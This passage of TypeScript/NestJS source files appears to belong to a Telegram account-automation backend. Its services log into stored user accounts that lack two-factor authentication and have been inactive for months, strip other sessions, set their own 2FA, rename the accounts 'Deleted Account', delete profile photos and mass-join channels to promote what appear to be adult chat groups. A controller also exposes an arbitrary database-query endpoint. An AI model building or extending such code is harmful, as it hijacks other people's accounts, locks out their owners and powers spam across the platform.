{\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<PromoteClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\n\n@Injectable()\nexport class PromoteClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) {}\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\");\n            this.clearJoinChannelInterval();\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n                await this.telegramService.disconnectAll();\n                await sleep(2000);\n                const clients = await this.promoteClientModel.find({ channels: { \"$lt\": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\n                            console.log(\"Started Joining for : \", document.mobile);\n                            const channels = await client.channelInfo(true);\n                            console.log(\"Existing Channels Length : \", channels.ids.length);\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            let result = [];\n                            if (channels.canSendFalseCount < 50) {\n                                if (channels.ids.length < 220) {\n                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                } else {\n                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                }\n                                this.joinChannelMap.set(document.mobile, result);\n                            } else {\n                                await client.leaveChannels(channels.canSendFalseChats);\n                            }\n                            await this.telegramService.deleteClient(document.mobile);\n                        } catch (error) {\n                            const parsedError = parseError(error);\n                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);\n                        }\n                    }\n\n                    this.joinChannelQueue();\n\n                }\n                console.log(\"Joining Channel Triggered Successfully for\", clients.length);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                console.error(\"Error during the joinchannelForPromoteClients process: \", error);\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            console.log(\"Ignored active check for promote channels as an active client setup exists\");\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels: \", channels.length);\n                            this.joinChannelMap.set(mobile, channels);\n\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join: \", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\n                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);\n                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);\n                                    this.removeFromPromoteMap(mobile);\n                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channelsInfo.ids.length });\n                                }\n                            } finally {\n                                await this.telegramService.deleteClient(mobile);\n                            }\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval();\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForPromoteClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await this.telegramService.createClient(mobile, false)\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                        await this.telegramService.deleteClient(document.mobile)\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\n\n@Global()\n@Module({\n  imports: [\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { initModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [initModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return 